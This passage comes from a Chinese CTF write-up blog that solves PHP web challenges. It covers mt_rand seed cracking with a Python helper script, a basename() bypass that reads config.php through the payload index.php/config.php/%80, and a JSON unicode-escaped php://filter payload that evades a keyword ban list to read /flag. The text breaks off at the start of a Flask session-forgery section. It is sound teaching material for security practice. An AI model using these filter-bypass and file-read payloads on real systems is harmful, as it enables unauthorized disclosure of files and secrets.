<span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p id='p1'&gt;&quot;</span><span class="token punctuation">.</span><span class="token variable">$str_show</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>x
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;check.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><p>随机数的种子是0~999999999之间的随机数，随机数取的是0~字符串str_long1的长度值，并且给了生成字符串的前10位。</p> <p>接下来就是利用给出的字符串得到随机数，并且转换成符合规则的数据格式，EXP如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>str1 <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
str2 <span class="token operator">=</span> <span class="token string">'Sd8QsWB02a'</span>
res <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'0'</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span>
            <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200716134210.png" alt="image-20200716134107085"></p> <p>将得到的数据放到工具里去爆破，得到种子：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200716134253.png" alt="image-20200716134253815"></p> <p>根据种子生成字符串：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">681929264</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>
<span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token punctuation">}</span>
<span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;p id='p1'&gt;&quot;</span><span class="token punctuation">.</span><span class="token variable">$str_show</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200716134441.png" alt="image-20200716134441121"></p> <p><strong>这里有个小坑要注意一下，爆破出的种子的PHP版本是7.1.0+，必须使用符合该版本的PHP环境来生成目标字符串，否则就会得到错误结果。</strong></p> <p>将得到的结果输入即可得到flag</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200716134645.png" alt="image-20200716134644958" style="zoom:50%;"> <h3 id="can-you-guess-it"><a href="#can-you-guess-it" class="header-anchor">#</a> Can you guess it?</h3> <p><strong>考点：basename()函数的漏洞</strong></p> <p>basename()函数详情：<a href="https://www.w3school.com.cn/php/func_filesystem_basename.asp" target="_blank" rel="noopener noreferrer">W3school PHP basename() 函数<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>例如<code>index.php/a.php</code>经过basename()处理之后就会得到<code>a.php</code>，<code>index.php/a.php/b.php</code>经过处理之后会得到<code>b.php</code>，但是basename()函数会忽略%81~%ff这种超过ascii码表范围的字符，也就是说<code>index.php/a.php/%81</code>经过处理之后仍然是<code>a.php</code>。</p> <p>本地测试如下：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200721182639.png" alt="image-20200721182632625"></p> <p><strong>题解</strong>：</p> <p>题目一开始就直接给了源码：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">;</span> <span class="token comment">// FLAG is defined in config.php</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;I don't know what you are thinking, but I won't let you read it :)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Wrong.'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>utf-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Can you guess it?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Can you guess it?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>If your guess is correct, I'll give you the flag.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>?source<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>Source<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter important">?&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$message</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter important">?&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>index.php<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>guess<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br></div></div><p>这种算法产生的随机数，并且用hash_equals()进行比较，感觉爆破没戏了，，其实本题目中这个随机数就是一个障眼法，真正的突破点就在basename()函数上。</p> <p>正则会对URL进行匹配，如果URL以[config.php加上任意数量个/符号]结尾，则会直接退出程序，比如：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200716171430.png" alt="image-20200716171430171"></p> <p>一般来说，这种正则可以利用<code>index.php/config.php/a</code>来进行绕过，但是这样的payload经过basename()函数处理之后就会得到a，无法获得config.php的源码。</p> <p>这时候利用上文提到过的basename()会忽略%80~%ff之间的字符这一特点，传入payload<code>index.php/config.php/%80</code>这样经过basename()解析之后得到结果仍然是config.php，同时也绕过了正则的匹配。</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200716172011.png" alt="image-20200716172011838"></p> <h3 id="encode-and-encode"><a href="#encode-and-encode" class="header-anchor">#</a> encode and encode</h3> <p><strong>考点：</strong></p> <ul><li><strong>json格式数据的unicode编码绕过</strong></li> <li><strong>file_get_contents()触发php伪协议</strong></li></ul> <p>json数据unicode编码参考文章：<a href="https://segmentfault.com/a/1190000022797773" target="_blank" rel="noopener noreferrer">在这里<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>题目直接给了源码（已经对某些关键部分进行注释）：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token comment">// no path traversal</span>
    <span class="token single-quoted-string string">'\.\.'</span><span class="token punctuation">,</span>
    <span class="token comment">// no stream wrapper</span>
    <span class="token single-quoted-string string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>
    <span class="token comment">// no data exfiltration</span>
    <span class="token single-quoted-string string">'flag'</span>
  <span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/i'</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//接受我们传入的数据流</span>
<span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//对传入的参数进行json格式的解码并转化为数组</span>
<span class="token comment">// is_valid()函数禁用了常用的伪协议和flag关键字</span>
<span class="token comment">// 所以我们传入的字符串应该是json格式</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;p&gt;invalid request&lt;/p&gt;'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// no data exfiltration!!!</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/HarekazeCTF\{.+\}/i'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'HarekazeCTF{&amp;lt;censored&amp;gt;}'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><p>程序会对我们传入的数据流进行json格式的解码，但是is_valid()函数却是仍然使用的解码之前的数据进行正则匹配，这就导致我们可以利用json格式数据中的unicode编码来绕过正则的匹配，在经过解码之后，数据仍然为正常的字符串。</p> <p>下面是一个小小的测试：</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200717230039.png" alt="image-20200717225834003" style="zoom:50%;"> <p>这样一来，我们就可以把关键字进行json格式的unicode编码，这样既绕过了正则匹配，同时又不影响数据的正常解析：</p> <div class="language-json line-numbers-mode"><pre class="language-json"><code><span class="token punctuation">{</span><span class="token property">&quot;page&quot;</span> <span class="token operator">:</span> <span class="token string">&quot;\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067&quot;</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200717230229.png" alt="image-20200717230229708" style="zoom:50%;"> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200717230317.png" alt="image-20200717230317136" style="zoom:67%;"> <h3 id="swpu2019-web3"><a href="#swpu2019-web3" class="header-anchor">#</a> [SWPU2019]Web3</h3> <p><strong>考点：</strong></p> <ul><li><strong>flask session伪造</strong></li> <li><strong>软链接攻击</strong></li> <li><strong>代码审计</strong></li></ul> <p>进入题目是登录框，这里任意账号密码登录即可，登录后有一个上传文件的按钮，但是我们却没有权限</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718232412.png" alt="image-20200718232329210" style="zoom:67%;"> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718232358.png" alt="image-20200718232322083"></p> <p>没权限，结合题目的网站名称&quot;CTF-Flask-Demo&quot;，盲猜一波Flask session伪造。</p> <ul><li>Flask的session是存放在客户端的，一旦secret_key泄露，就会导致session伪造</li></ul> <p>看一下cookie:</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719071417.png" alt="image-20200719071417557" style="zoom:67%;"> <p>下面找一下secret_key</p> <ul><li>一般来说，CTF中涉及Flask session伪造的题目都会给出secret_key，一般会出现在在<strong>题目泄露的源码中、robots.txt中、响应头中</strong>。</li></ul> <p>看一下robots.txt，返回404</p> <p><img 